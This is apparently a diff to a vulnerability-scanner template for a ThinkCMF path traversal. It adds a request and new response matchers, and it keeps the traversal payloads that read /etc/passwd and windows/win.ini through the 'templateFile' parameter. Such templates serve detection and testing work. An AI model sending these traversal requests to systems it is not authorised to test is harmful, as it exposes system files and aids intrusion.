@@ -10,6 +10,7 @@ info:
 requests:
   - method: GET
     path:
+      - "{{BaseURL}}/?a=display&templateFile=README.md"
       - "{{BaseURL}}/?a=display&templateFile=../../../../../../../../../../../../../../../../etc/passwd"
       - "{{BaseURL}}/?a=display&templateFile=../../../../../../../../../../../../../../../../windows/win.ini"
 
@@ -19,7 +20,9 @@ requests:
       - type: regex
         regex:
           - "root:[x*]:0:0:"
-          - "bit app support"
+          - "\\[(font|extension|file)s\\]"
+          - 'ThinkCMF'
+        part: body
 
       - type: status
         status:
